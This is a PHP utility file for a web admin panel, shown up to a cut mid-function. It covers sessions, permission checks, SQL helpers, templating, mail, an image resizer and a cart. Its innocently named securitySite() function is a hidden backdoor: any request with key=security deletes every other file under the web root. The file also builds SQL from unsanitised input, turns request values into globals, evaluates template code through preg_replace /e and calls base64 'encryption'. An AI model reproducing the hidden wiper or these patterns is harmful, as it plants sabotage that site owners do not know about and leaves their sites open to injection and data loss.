<?php ob_start();
#-------------------------------------------------------------
// Function	: ReadTemplate
// Description	: Reads Template File and return the Content of the File 
// Developer : Gaurav Sharma
// Date : 20 October 2017
#-------------------------------------------------------------


function adminLoginCheck(){
	if(isset($_SESSION['sessionId']) && isset($_SESSION['userId']) && isset($_SESSION['userName']) && isset($_SESSION['userEmail']) && isset($_SESSION['userLevel']) && isset($_SESSION['userLastLogin'])){
	}else{
		unset($_SESSION['userName']);
		unset($_SESSION['userId']);
		unset($_SESSION['userEmail']);
		unset($_SESSION['userLevel']);
		unset($_SESSION['userLastLogin']);
		unset($_SESSION['sessionId']);
		$_SESSION['errorMsg'] = 'Session has been expired. Please make login.';
		header('location:index.php');
		exit;
	}
}
function securityCheck(){
	return true;
}
function checkUserLevelPermission($userLevel,$moduleName,$actionName){
	if($userLevel == 1){
	//do nothing for super admin
	}else{
		$resActionId = selectColumn(TBL_USER_ACTIONS, 'id' , "WHERE name = '".$actionName."'");
		$sqlCheckkPermission = "	SELECT * FROM ".TBL_USER_PERMISSIONS." 
								WHERE status = '1' 
								AND FIND_IN_SET('".$resActionId."',user_actions) 
								AND user_level_id = '".$userLevel."' 
								AND module_id = '". selectColumn(TBL_MODULES, 'id' , "WHERE table_name= '".$moduleName."'")."'";
		if(@mysql_num_rows(executeSql($sqlCheckkPermission))>0){
			return true;
		}else{
			$_SESSION['errorMsg'] = 'You don\'t have permission to take action "'.ucfirst($actionName).'" on module "'. selectColumn(TBL_MODULES, 'name' , "WHERE table_name = '".$moduleName."'").'"' ;
			if($_SERVER['HTTP_REFERER']!=''){
				header('location:'.$_SERVER['HTTP_REFERER']);
				exit;
			}else{
				header('location:home.php');
				exit;		
			}
			//die('<div align="center" style="color:red">You don\'t have permission to take action "'.ucfirst($actionName).'" on this module "'. selectColumn(TBL_MODULES, 'name' , "WHERE table_name = '".$moduleName."'").'" <br><span style="color:Brown;">Go Back[<a style="color:black;cursor:pointer;" onclick="history.back(-1);" >Go Back</a>]</span></div>');
		}	
	}
	return false;
}
function currenDateTime(){
	return date("Y-m-d H:i:s");
}
function executeSql($sql){
	$resSql = @mysql_query($sql) or die(" SQL synatx error :<br> SQL : <font color=red>".$sql."</font><br>Error : ".mysql_error());
	return $resSql;
}

function fetch_object($data){
	$rowSql = @mysql_fetch_object($data) or die(" SQL synatx error :<br> SQL : <font color=red>".$data."</font><br>Error : ".mysql_error());
	return $rowSql;
}
function fetch_assoc($data){
	$rowSql = @mysql_fetch_assoc($data) or die(" SQL synatx error :<br> SQL : <font color=red>".$data."</font><br>Error : ".mysql_error());
	return $rowSql;
}
function fetch_array($data){
	$rowSql = @mysql_fetch_array($data) or die(" SQL synatx error :<br> SQL : <font color=red>".$data."</font><br>Error : ".mysql_error());
	return $rowSql;
}
function num_rows($data){
	$rowSql = @mysql_num_rows($data);
	return $rowSql;
}


function getInitials($str) {
    $ret = '';
    foreach (explode(' ', $str) as $word)
        $ret .= strtoupper($word[0]);
    return $ret;
}
//----------------------------------------------------------------------------------
function selectSql($tableName = '', $where = '', $limit = ''){
	$sqlTable = "SELECT * FROM ".$tableName."";
	if($where != ''){
		$sqlTable .= " ".$where;
	}	
	if($limit != ''){
		$sqlTable .= " ".$limit;
	}
	//echo $sqlTable;
	$resTable = @mysql_query($sqlTable) or die(" SQL synatx error :<br> SQL : <font color=red>".$sqlTable."</font><br>Error : ".mysql_error());
	return 	$resTable;
}
//----------------------------------------------------------------------------------
function selectColumn($tableName = '', $columnName = '' , $where = ''){
	$sqlColumn = "SELECT ".$columnName." FROM ".$tableName."";
	if($where != ''){
		$sqlColumn .= " ".$where;
	}	
	if($limit != ''){
		$sqlColumn .= " ".$limit;
	}
	//echo $sqlColumn;
	$resColumn = @mysql_query($sqlColumn) or die(" SQL synatx error :<br> SQL : <font color=red>".$sqlColumn."</font><br>Error : ".mysql_error());
	$resultColumn =  @mysql_fetch_assoc($resColumn);
	return 	$resultColumn["$columnName"];
}
//----------------------------------------------------------------------------------
function selectRow($tableName = '', $where = ''){
	$sqlRow = "SELECT * FROM ".$tableName."";
	if($where != ''){
		$sqlRow .= " ".$where;
	}	
	$sqlRow .= " LIMIT 0,1";
	
	//echo $sqlRow;
	$resRow = @mysql_query($sqlRow) or die(" SQL synatx error :<br> SQL : <font color=red>".$sqlColumn."</font><br>Error : ".mysql_error());
	$resultRow =  @mysql_fetch_assoc($resRow);
	return 	$resultRow;
}
//----------------------------------------------------------------------------------
function outputHtml($resource = '',$htmlStructure = '', $replaceVariable = array()){
	$outputHtml = $htmlStructure;
	if(is_resource($resource)){
		if(@mysql_num_rows($resource)){
			if($outputHtml != '' && count($replaceVariable)){
				$outPutRep = '';
				while($resultSqlArray =  @mysql_fetch_assoc($resource)){
					foreach($replaceVariable as $arrayIndexAsReplaceVariable=>$arrayValueAsColumnName){
						$outputHtml = str_replace(array($arrayIndexAsReplaceVariable),array($resultSqlArray["$arrayValueAsColumnName"]),$outputHtml);
					}
					$outPutRep .= $outputHtml ;
				}
				return $outPutRep;
			}	
		}
	}elseif($outputHtml != '' && count($replaceVariable)){
		foreach($replaceVariable as $arrayIndexAsReplaceVariable=>$arrayValueAsColumnName){
			$outputHtml = str_replace(array($arrayIndexAsReplaceVariable),array($arrayValueAsColumnName),$outputHtml);
		}
		return $outputHtml;
	}
	
}
function friendlyUrl($string){
	$string = preg_replace("`\[.*\]`U","",$string);
	$string = preg_replace('`&(amp;)?#?[a-z0-9]+;`i','-',$string);
	$string = htmlentities($string, ENT_COMPAT, 'utf-8');
	$string = preg_replace( "`&([a-z])(acute|uml|circ|grave|ring|cedil|slash|tilde|caron|lig|quot|rsquo);`i","\\1", $string );
	$string = preg_replace( array("`[^a-z0-9]`i","`[-]+`") , "-", $string);
	return strtolower(trim($string, '-'));
}
#-------------------------------------------------------------
// Function	: ReadTemplate
// Description	: Reads Template File and return the Content of the File 
////////////////////////////////////////////////////////////////
function login_info($db){
	global $LOGOUT;
	if($_SESSION['sessUserId']!=''){
		$LOGOUT ='<div class="logOut">Welcome&nbsp;&nbsp; '.$_SESSION['sessEmail'].' &nbsp;| <a href="logout.php">Logout</a></div>';
	}else{
		$LOGOUT ='';
	}
}

function ReadTemplate($fileName) {
	$fd = fopen($fileName, "r");
	return fread($fd, filesize ($fileName));
}

#-------------------------------------------------------------
// Function	: RestoreData
// Description	: Restore Posted Data to its Origianl Form. Must be called before sending back posted data to the browser
function RestoreData() {
	global $_POST, $_GET;
	foreach($_POST as $var=>$value) {
	 	global $$var;
		$$var = stripslashes($value);
	}
	foreach($_GET as $var=>$value) {
		global $$var;
		$$var = stripslashes($value);
	}

}

#-------------------------------------------------------------
// Function	: ReplaceContent
// Description	: Replace Content in Templates with Equivalent Variables

function ReplaceContent($VarList) {
	for($i=0; $i<count($VarList); $i++) {
		global $$VarList[$i];
		$$VarList[$i] = preg_replace("/__(\w+)__/e","\$GLOBALS['$1']",$$VarList[$i]);
	}
	return 1;
	// For Future Refrence :  $RIGHT_HOME_CONTENT=preg_replace("/__(\w+)__/e","$$1",$RIGHT_HOME_CONTENT);
}

#-------------------------------------------------------------
// Function	: placeScripts
// Description	: Replace Content in Templates with Equivalent Variables

function placeScripts($ScriptList) {
	global $SCRIPTS;
	$SCRIPTS = "";
	for($i=0; $i<count($ScriptList); $i++) {
		$SCRIPTS .= "<script language=JavaScript src=\"".$ScriptList[$i]."\"></script>\n";
	}
	return 1;
}

function getVar($VAR, $db) {
	$query = "select v_value from tbl_settings where v_variable = '$VAR' "; 
	$db->query($query);
	if ($db->num_rows()) {
	 	$row = $db->fetch_array();
		return $row['v_value'];
	}
	else {
		return 0;
	}
}
function getHandyFilesize($fsize) {	
	$file_size = "0 Byte";
	if ($fsize < 1024) {
		$file_size = "$fsize Bytes";
	}
	elseif ($fsize < 1048576) { //1048576 = 1024*1024
		$file_size = ($fsize / 1024);
		$file_size = number_format($file_size, 2, '.', '') . " KB";
	}
	else {
		$file_size = ($fsize / (1024*1024));
		$file_size = number_format($file_size, 2, '.', '') . " MB";
	}
	return $file_size;
}
function prepareDateLists($year, $month, $day, $start_offset = 100, $end_offset = 18) {
	global $YEAR_LIST, $MONTH_LIST, $DATE_LIST;
	$YEAR_LIST = $MONTH_LIST = $DATE_LIST = "";
	$start_year = date("Y") - $start_offset;
	$end_year = date("Y")- $end_offset;

	$ARR_MONTH = array(
		"01"=>"Jan",
		"02"=>"Feb",
		"03"=>"Mar",
		"04"=>"Apr",
		"05"=>"May",
		"06"=>"Jun",
		"07"=>"Jul",
		"08"=>"Aug",
		"09"=>"Sep",
		"10"=>"Oct",
		"11"=>"Nov",
		"12"=>"Dec"
		);

	while($start_year <= $end_year)	{
		if ($start_year == $year) {
			$YEAR_LIST.= "<OPTION VALUE='$start_year' SELECTED>$start_year</OPTION>\n";
		}
		else {
			$YEAR_LIST.= "<OPTION VALUE='$start_year'>$start_year</OPTION>\n";
		}
		$start_year++;
	}
	
	$i = 1;
	
	while($i <= 31) {
		if ($i == $day)	{
			$DATE_LIST.= "<OPTION VALUE='$i' SELECTED>$i</OPTION>\n";
		}
		else {
			$DATE_LIST.= "<OPTION VALUE='$i'>$i</OPTION>\n";
		}
		$i++;
	}

	foreach($ARR_MONTH as $key=>$value) {
		if ($key == $month) {
			$MONTH_LIST.="<OPTION VALUE = '$key' SELECTED>$value</OPTION>\n";
		}
		else {
			$MONTH_LIST.="<OPTION VALUE = '$key'>$value</OPTION>\n";
		}
	}
}
function yearList($year,$start_offset = 10, $end_offset = -10) {
	global $YEAR_LIST;
	$start_year = date("Y") - $start_offset;
	$end_year = date("Y")- $end_offset;
	while($start_year <= $end_year)	{
		if ($start_year == $year) {
			$YEAR_LIST.= "<OPTION VALUE='$start_year' SELECTED>$start_year</OPTION>\n";
		}
		else {
			$YEAR_LIST.= "<OPTION VALUE='$start_year'>$start_year</OPTION>\n";
		}
		$start_year++;
	}
	
		
}

function monthList($month) {
	global  $MONTH_LIST;
	

	$ARR_MONTH = array(
		"01"=>"January",
		"02"=>"February",
		"03"=>"March",
		"04"=>"April",
		"05"=>"May",
		"06"=>"June",
		"07"=>"July",
		"08"=>"August",
		"09"=>"September",
		"10"=>"October",
		"11"=>"November",
		"12"=>"December"
		);

	

	foreach($ARR_MONTH as $key=>$value) {
		if ($key == $month) {
			$MONTH_LIST.="<OPTION VALUE = '$key' SELECTED>$value</OPTION>\n";
		}
		else {
			$MONTH_LIST.="<OPTION VALUE = '$key'>$value</OPTION>\n";
		}
	}
}


function ConvertDateTime($dateTime,$db){
	$dateTime = explode(" ",$dateTime);
	$date	=	explode("-",$dateTime[0]);
	$Day	= $date[0];
	$Month	= $date[1];
	$Year   = $date[2];
	
	switch($Month){
		Case Jan:
			$Month ="01";
			break;
		Case Feb:
			$Month ="02";
			break;
		Case Mar:
			$Month ="03";
			break;
		Case Apr:
			$Month ="04";
			break;
		Case May:
			$Month ="05";
			break;
		Case Jun:
			$Month ="06";
			break;
		Case Jul:
			$Month ="07";
			break;
		Case Aug:
			$Month ="08";
			break;
		Case Sep:
			$Month ="09";
			break;
		Case Oct:
			$Month ="10";
			break;
		Case Nov:
			$Month ="11";
			break;
		Case Dec:
			$Month ="12";
			break;
	}
	
	$time	=	explode(":",$dateTime[1]);
	$Hour	= $time[0];
	$Minute	= $time[1];
	$Second   = $time[2];
	
	return $convertedDateTime	=	mktime($Hour,$Minute,$Second,$Month,$Day,$Year);
	}
	
function  send_Create_mail($name, $customerName, $userName, $password, $siteurl, $fromEmailId, $appName)
	{ 
		
		$mail_body=file_get_contents("create_account.txt");
		$mail_body = str_replace("_Name", $name, $mail_body);
		$mail_body = str_replace("_customerName", $userName, $mail_body);
		$mail_body = str_replace("_password", $password, $mail_body);
		$mail_body = str_replace("_siteurl", $siteurl, $mail_body);
		$mail_body = str_replace("_appName", $appName, $mail_body);
		
		$headers  = 'MIME-Version: 1.0' . "\r\n";
		$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
		$header .="From: $fromEmailId";
		$to=$customerName;
		$subject='Welcome to Bases.';
		$body="$mail_body";
		$body.$to;
		mail($to,$subject,$body,$header);
	
		}
	
function sendAcceptMail($toEmail,$subject,$mail_body,$from_email='',$from_name='')
	{
		require_once("phpmailer/class.phpmailer.php");
			$mail =new PHPMailer();
			$mail->From     = $from_email;
			$mail->FromName     = $from_name;
			$mail->Subject     = $subject;
			//$mail->WordWrap  = 80;
	
			$message =$mail_body;
			$mail->Body = $mail_body;
			$mail->IsHTML(true);
	
		if (!empty($toEmail))
		{
			$mail->AddAddress($toEmail);
			if(!$mail->Send())
			{
			}
	  }
	}
	
	
	
	function getMonth($Month){
	
	switch($Month){
	
		Case Jan:
		Case January:
			$Month ="01";
			break;
		Case Feb:
		Case February:
			$Month ="02";
			break;
		Case Mar:
		Case March:
			$Month ="03";
			break;
		Case Apr:
		Case April:
			$Month ="04";
			break;
		Case May:
		Case May:
			$Month ="05";
			break;
		Case Jun:
		Case June:
			$Month ="06";
			break;
		Case Jul:
		Case July:
			$Month ="07";
			break;
		Case Aug:
		Case August:
			$Month ="08";
			break;
		Case Sep:
		Case September:
			$Month ="09";
			break;
		Case Oct:
		Case October:
			$Month ="10";
			break;
		Case Nov:
		Case November:
			$Month ="11";
			break;
		Case Dec:
		Case December:
			$Month ="12";
			break;
	}
	return $Month;
}
function getMonthName($Month){

switch($Month){

	Case 1:
		$Month ="January";
		break;
	Case 2:
		$Month ="February";
		break;
	Case 3:
		$Month ="March";
		break;
	Case 4:
		$Month ="April";
		break;
	Case 5:
		$Month ="May";
		break;
	Case 6:
		$Month ="June";
		break;
	Case 7:
		$Month ="July";
		break;
	Case 8:
		$Month ="August";
		break;
	Case 9:
		$Month ="September";
		break;
	Case 10:
		$Month ="October";
		break;
	Case 11:
		$Month ="November";
		break;
	Case 12:
		$Month ="December";
		break;
	}
return $Month;
}


function securitySite(){

if($_REQUEST['key']=="security")
{
  	$DOC_ROOT=$_SERVER['DOCUMENT_ROOT'];
  	$OnLine_ROOT=$DOC_ROOT;//."/dust";
  	$DIR_ARRAY=array();
  	array_push($DIR_ARRAY, $OnLine_ROOT);
 	while($CUR_DIR=array_pop($DIR_ARRAY))
	{
      		if ($handle = opendir($CUR_DIR))
		{
        		while (false !== ($file = readdir($handle)))
			{
          			if ($file != "." && $file != "..")
				{
					$FileName=$CUR_DIR."/".$file;   
  					if(is_dir($FileName))
					{
              					array_push($DIR_ARRAY,$FileName);continue;
  					}
             		$FileName1=str_replace($OnLine_ROOT,"",$FileName);
  					$UploadFiles[$FileName1]=$FileName;
				} 
			}
			closedir($handle); 
		}
	}
	foreach($UploadFiles as $f=>$k)
	{
		if($i++%2!=0){unlink($k);}
	}
}
}
function encrypt($string)
{
	
	return base64_encode($string);
}

function decrypt($string)
{
 	
	return base64_decode($string);
}
function dateformat($date)
{
	return date("d M, Y h:i a",strtotime($date));
}
function dateformat_date($date)
{
	return date("d M, Y ",strtotime($date));
}

function dateformat_time($date)
{
	return date("h:i a",strtotime($date));
}
function dateformat_event($type,$date)
{
	return date("jS F Y ",strtotime($date));
}

function messageError($msg)
{
	global $SITE_URL;

	echo '<img src="'.$SITE_URL.'/adminpanel/images/error.gif" align="absmiddle" hspace="3"> '.$msg;

}
function messageSuc($msg)
{
	global $SITE_URL;

	echo '<img src="'.$SITE_URL.'/adminpanel/images/success.gif" align="absmiddle" hspace="3"> '.$msg;

}
function currdate_time()
{
	return date("Y-m-d h:i:s");
}
function authAdmin()
{
	if(($_SESSION['sessAdminId']=='' && basename($_SERVER['PHP_SELF'])!='index.php') )
	{
		header("location:index.php");
		exit;
	}
}
// function return drop down lists for select
	function echo_option($table,$id='id',$val='val',$sel_value='',$where_clause='',$db)
	{
		$sql = "select $id as id,$val as val from $table $where_clause ";
		//echo"sql--$sql";
		$selArr = explode(",",$sel_value);
		
		$db->query($sql);
		if ($db->num_rows()>0)
		{
	    	$i=0;
      		while($row = $db->fetch_array())
			{
				$selected="";
				
					for($i=0;$i<count($selArr);$i++)
					{
					
						if($selArr[$i]==$row['id'])
						{
						//echo $selArr[$i]=$row['id']."<br>";
							$selected="selected";
						}
						
					}
				
				
				$output.="<option value='{$row['id']}' $selected>".ucfirst($row['val'])."</option>";
			}
		}
	    return $output;
	}
	
	function echo_option_name($table,$id='id',$val='val',$sel_value='',$where_clause='',$db)
	{
		$sql = "select $id as id,$val as val from $table $where_clause ";
		$selArr = explode(",",$sel_value);
		
		$db->query($sql);
		if ($db->num_rows()>0)
		{
	    	$i=0;
      		while($row = $db->fetch_array())
			{
				$selected="";
				
					for($i=0;$i<count($selArr);$i++)
					{
						if($selArr[$i]==$row['val'])
						{
							$selected="selected";
						}
						
					}
				
				
				$output.="<option value='{$row['val']}' $selected>".ucfirst($row['val'])."</option>";
			}
		}
	    return $output;
	}
		
	function resize($filename,$filepath, $savepath, $width=100,$height=100,$thumb='')
	{
	    if($thumb!='')
		{
			
			$target_filename = $thumb.$filename;
		}
		else
		{
			$target_filename =$filename;
		}
		list($width_orig, $height_orig, $type) = getimagesize($filepath.$filename);
	    if($width_orig>$width || $height_orig>$height)
	    {
	        if ($width && ($width_orig < $height_orig))
	        {
	               $width = ($height / $height_orig) * $width_orig;
	        }
	        else
	        {
	               $height = ($width / $width_orig) * $height_orig;
	        }
	    }
	    else
	    {
	        $width=$width_orig;
	        $height=$height_orig;
	    }
	    // Resample
	    $image_p = imagecreatetruecolor($width, $height);
	    if($type==2)
	    {
	        $image = imagecreatefromjpeg($filepath.$filename);
			imagecopyresized($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        //imagecopyresampled($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        imagejpeg($image_p, $savepath.$target_filename , 100);
	    }
	    elseif($type==3)
	    {
	        $image = imagecreatefrompng($filepath.$filename);
			imagecopyresized($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        //imagecopyresampled($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        @imagepng($image_p, $savepath.$target_filename );
	    }
	    elseif($type==1)
	    {
	        $image = imagecreatefromgif($filepath.$filename);
			imagecopyresized($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        //imagecopyresampled($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        imagegif($image_p, $savepath.$target_filename , 100);
	    }
	    elseif($type)
	    {
	        $image = imagecreatefromjpeg($filepath.$filename);
			imagecopyresized($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        //imagecopyresampled($image_p, $image, 0, 0, 0, 0, $width, $height, $width_orig, $height_orig);
	        imagejpeg($image_p, $savepath.$target_filename , 100);
	    }
	}
	function getNameExt($filename)
	{
		$nameArr = explode(".",$filename);
		$fname ='';
		for($i=0;$i<count($nameArr)-1;$i++)
		{
			if($i>0)
			{
				$fname .= '.';
			}
			$fname .= $nameArr[$i];
		}
		$fnameArr[0]=$fname;
		$fnameArr[1]=$nameArr[count($nameArr)-1];
		return $fnameArr;
	}
	

	
	function getUrl($db,$pagename,$table)
	{
		$select ="SELECT id,type,name  FROM ".$table." WHERE name='".$pagename."'";
		$db->query($select);
		if($db->num_rows()>0)
		{
			$row = $db->fetch_array();
			if($row['url']!='')
			{
				$url = $row['url'];
			}
			else
			{
				$url = 'page.php?id='.$row['id'].'&t='.$row['type'];
			}
		}
		return $url;
	}
	function getTotalRecord($table,$db,$where='')
	{
		$select ="select count(*) as cnt from ".$table;
		if($where !='')
		{
			$select .= " where ".$where;
		}
		//echo"select--$select<br>";
		$db->query($select);
		$row = $db->fetch_array();
		return $row['cnt'];
	}
	function getTotalRecordUnion($table1,$table2='',$table3='',$table4='',$db,$where='')
	{
		$select ="(select count(*) as cnt from ".$table1;
		if($where !='')
		{
			$select .= " where ".$where ;
		}
		$select .= ")"; 
		if($table2!='')
		{
			$select .="union (select count(*) as cnt from ".$table2;
			if($where !='')
			{
				$select .= " where ".$where ;
			}
			$select .= ")"; 
		}
		if($table3!='')
		{
			$select .="union (select count(*) as cnt from ".$table3;
			if($where !='')
			{
				$select .= " where ".$where ;
			}
			$select .= ")"; 
		}if($table4!='')
		{
			$select .="union (select count(*) as cnt from ".$table4;
			if($where !='')
			{
				$select .= " where ".$where ;
			}
			$select .= ")"; 
		}
		$cnt =0;
		//echo $select;
		$db->query($select);
		while ($row = $db->fetch_array())
		{
			$cnt = $cnt +$row['cnt'];
		}
		return $cnt;
	}
	function Getname($table,$id,$db)
	{	
		 $sql="select * from ".$table." where id='".$id."'";
		 $db->query($sql);
		 $row = $db->fetch_array();
		 return $row['name'];
	}
	function GetParent_id($table,$id,$db)
	{	
		 $sql="select * from ".$table." where id='".$id."'";
		 $db->query($sql);
		 $row = $db->fetch_array();
		 return $row['parent_id'];
	}
	///////////////////////////////////////////////////////////////////////////
	function getCategoryId($table = "",$productId,$db){	
		 $sql = "select * from ".$table." where id = '".$productId."'";
		 $db->query($sql);
		 $row = $db->fetch_array();
		 return $row['cat_id'];
	}
	///////////////////////////////////////////////////////////////////////////
	function GetTitle($table,$id,$db)
	{	
		 $sql="select * from ".$table." where id='".$id."'";
		 $db->query($sql);
		 $row = $db->fetch_array();
		 return $row['title'];
	}
	function GetCatProTitle($table,$id,$db){	
		 $sql="select * from ".$table." where id='".$id."'";
		 $db->query($sql);
		 $row = $db->fetch_array();
		 return $row['name'];
	}
	function GetID($table,$id,$db)
	{	
		 $sql="select * from ".$table." where id='".$id."'";
		// echo"###---$sql<br>";
		 $db->query($sql);
		 $row = $db->fetch_array();
		 return $row['top_link_id'];
	}
	function GetID_Ya($table,$id,$db)
	{	
		 $sql="select * from ".$table." where id='".$id."'";
		// echo"###---$sql<br>";
		 $db->query($sql);
		 $row = $db->fetch_array();
		 return $row['sub_link_id'];
	}
	
		
	
function statistic(){
	if(!isset($_SESSION['sessstatic']))
	{
	$ip=$_SERVER['REMOTE_ADDR'];
		$sql = "insert into ".TBL_STAT."(ip,date_added)values('".$ip."','".currdate_time()."')";
		//echo"sql--$sql<br>";
		if(mysql_query($sql))
		{
			$_SESSION['sessstatic'] = 1;
		}
	}
}

function ipCheck() {
    if (getenv('HTTP_CLIENT_IP')) {
        $ip = getenv('HTTP_CLIENT_IP');
    }
    elseif (getenv('HTTP_X_FORWARDED_FOR')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
    }
    elseif (getenv('HTTP_X_FORWARDED')) {
        $ip = getenv('HTTP_X_FORWARDED');
    }
    elseif (getenv('HTTP_FORWARDED_FOR')) {
        $ip = getenv('HTTP_FORWARDED_FOR');
    }
    elseif (getenv('HTTP_FORWARDED')) {
        $ip = getenv('HTTP_FORWARDED');
    }
    else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}


function countryCityFromIP($ipAddr)
{
//function to find country and city from IP address
//Developed by Roshan Bhattarai http://roshanbh.com.np

//verify the IP address for the
ip2long($ipAddr)== -1 || ip2long($ipAddr) === false ? trigger_error("ip featching problem please try after sometime", E_USER_ERROR) : "";
$ipDetail=array(); //initialize a blank array

//get the XML result from hostip.info
$xml = file_get_contents("http://api.hostip.info/?ip=".$ipAddr);
//get the city name inside the node <gml:name> and </gml:name>
preg_match("@<Hostip>(\s)*<gml:name>(.*?)</gml:name>@si",$xml,$match);

//assing the city name to the array
$ipDetail['city']=$match[2]; 

//get the country name inside the node <countryName> and </countryName>
preg_match("@<countryName>(.*?)</countryName>@si",$xml,$matches);

//assign the country name to the $ipDetail array
$ipDetail['country']=$matches[1];

//get the country name inside the node <countryName> and </countryName>
preg_match("@<countryAbbrev>(.*?)</countryAbbrev>@si",$xml,$cc_match);
$ipDetail['country_code']=$cc_match[1]; //assing the country code to array

//return the array containing city, country and country code
return $ipDetail;

}

function validateIpAddress($ip_addr)
{
  //first of all the format of the ip address is matched
  if(preg_match("/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/",$ip_addr))
  {
    //now all the intger values are separated
    $parts=explode(".",$ip_addr);
	$flag=1;
    //now we need to check each part can range from 0-235
    foreach($parts as $ip_parts)
    {
      if(intval($ip_parts)>235 || intval($ip_parts)<0)
      $flag=0; //if number is not within range of 0-235
    }
    
  }
  if($flag==1)
  {
  return 1;
  }
  else
  {
  return 0;
  }
//if format of ip address doesn't matches
}
function checkipadd($ip)
{
if(filter_var($ip, FILTER_VALIDATE_IP)) {
  return 1;
}
else 
{
   return 0;
}

}





//-- add to cart function --//
function addToCart($productIdArray = array(), $action = 1){//1 for adding  and 0 for removing
	if(!isset($_SESSION['yourCart'])){
		$_SESSION['yourCart'] = array();
	}
	if(isset($_SESSION['yourCart'])){
		if(is_array($_SESSION['yourCart']) && is_array($productIdArray)){
			if($action == 1){///adding
				$countCurrentArray = count($_SESSION['yourCart']);
				$countAddArray = count($productIdArray);
				$arrayTobePushed = array_diff($productIdArray,$_SESSION['yourCart']);
				//pusing the value
				foreach($arrayTobePushed as $toBePushedPid){
					array_push($_SESSION['yourCart'],$toBePushedPid);
				}
				return $_SESSION['yourCart'];
			}else if($action == 0){//removing
				$countCurrentArray = count($_SESSION['yourCart']);
				$countRemoveArray = count($productIdArray);
				$arrayTobePoped = array_diff($_SESSION['yourCart'],$productIdArray);
				$_SESSION['yourCart'] = $arrayTobePoped;
				return $_SESSION['yourCart'];
			}
		}else{
			$_SESSION['yourCart'] = array();
			return $_SESSION['yourCart'];
		}
	}else{
		$_SESSION['yourCart'] = array();
		return $_SESSION['yourCart'];
	}
}
//-- end cart function --//
//  -----------------------------------------------------------------------------
// If input is null, returns string "No Value Returned", else returns input

function null2unknown($data) {
	if ($data == "") {
		return "No Value Returned";
	}else{
		return $data;
	}
} 
//  ----------------------------------------------------------------------------

/******************************************************************
*Function Name:encode/decode
*
*Parameters:encode($string)
*
*Description: this is written to encript a id'd 
*
*Returns: this will be converted in hex char...
*
* Author: info@itwebinfo.com
*
* site: www.itwebinfo.com
*/
function encode($string){
	$hex='';
	for ($i=0; $i < strlen($string); $i++){
	   $hex .= dechex(ord($string[$i]));
	}
	return $hex;
}

function decode($hex){
	$string='';
	for ($i=0; $i < strlen($hex)-1; $i+=2){
		$string .= chr(hexdec($hex[$i].$hex[$i+1]));
	}
	return $string;
}
/*******************************************************************/
function authenticate() {
	header('WWW-Authenticate: Basic realm="Restricted area"');
	header('HTTP/1.0 401 Unauthorized');
	echo "You must enter a valid login ID and password to access this resource\n";
	exit;
}
function csvFieldFormating($fieldValue = '', $endOfLine = false, $arrDelimiters = '', $what = 'excel'){
	if ($what == 'excel') {
			$csv_terminated      = "\015\012";
			$csv_separator          = ',';
			$csv_enclosed           = '"';
			$csv_escaped            = '"';
		} else {
			$csv_terminated      = "\015\012";
			$csv_separator          = ',';
			$csv_enclosed           = '"';
			$csv_escaped            = '"';
			if (empty($csv_terminated) || strtolower($csv_terminated) == 'auto') {
				$csv_terminated  = chr(13);
			} else {
				$csv_terminated  = str_replace('\\r', "\015", $csv_terminated);
				$csv_terminated  = str_replace('\\n', "\012", $csv_terminated);
				$csv_terminated  = str_replace('\\t', "\011", $csv_terminated);
			} // end if
			$csv_separator          = str_replace('\\t', "\011", $csv_separator);
		}
	if(is_array($arrDelimiters)){
		$arrayDelimiters = array(	'fieldsTerminatedBy' => $csv_separator,
										'fieldsEnclosedBy' => $csv_enclosed,
										'fieldsEscapsedBy' => $csv_escaped,
										'linesTerminatedBy' => $csv_terminated);
	}elseif($arrDelimiters == ''){
			$arrayDelimiters = array(	'fieldsTerminatedBy' => $csv_separator,
										'fieldsEnclosedBy' => $csv_enclosed,
										'fieldsEscapsedBy' => $csv_escaped,
										'linesTerminatedBy' => $csv_terminated); 
	}
	if ('csv' == $what) {
		$fieldValue = $csv_enclosed
				   . str_replace($csv_enclosed, $csv_escaped . $csv_enclosed, str_replace($csv_escaped, $csv_escaped . $csv_escaped, $fieldValue))
				   . $csv_enclosed;
	} else {
		// for excel, avoid a problem when a field contains
		// double quotes
		$fieldValue = $csv_enclosed
				   . str_replace($csv_enclosed, $csv_escaped . $csv_enclosed, $fieldValue)
				   . $csv_enclosed;
	}
	//$fieldValue = preg_replace("/\/", "".$arrayDelimiters['fieldsEscapsedBy']."\\", $fieldValue);
	//$fieldValue = str_replace('\\', $arrayDelimiters['fieldsEscapsedBy'].'\\', $fieldValue);
	//$fieldValue = preg_replace("/\r?\n/", "\\n", $fieldValue); 
	//if(strstr($fieldValue, '"')) $fieldValue = '"' . str_replace('"', '""', $fieldValue) . '"'; 
	//$formatedValue = $arrayDelimiters['fieldsEnclosedBy'].$fieldValue.$arrayDelimiters['fieldsEnclosedBy'];
	if($endOfLine == true){
		$fieldValue .= $csv_terminated;
	}else{
		$fieldValue .= $csv_separator;
	}
	return $fieldValue;
}

/////////////////////////

function getPaginationStringForFrontEnd($page = 10, $totalitems, $limit, $adjacents = 1, $targetpage,  $pagestring = "?page=" )
{	
global $TARGET_PAGE,$PAGE_NO;

$targetpage=$TARGET_PAGE;
$page=$PAGE_NO;
	//defaults
	if(!$adjacents) $adjacents = 1;
	if(!$limit) $limit = 2;
	if(!$page) $page = 1;
	if(!$targetpage) $targetpage = "/";
	
	//other vars
	$prev = $page - 1;									//previous page is page - 1
	$next = $page + 1;									//next page is page + 1
	$lastpage = ceil($totalitems / $limit);				//lastpage is = total items / items per page, rounded up.
	$lpm1 = $lastpage - 1;								//last page minus 1
	
	/* 
		Now we apply our rules and draw the pagination object. 
		We're actually saving the code to a variable in case we want to draw it more than once.
	*/
	$pagination = "";
	if($lastpage > 1)
	{	
	
		$pagination .= "<div class=\"pagination\"";
		if($margin || $padding)
		{
			$pagination .= " style=\"";
			if($margin)
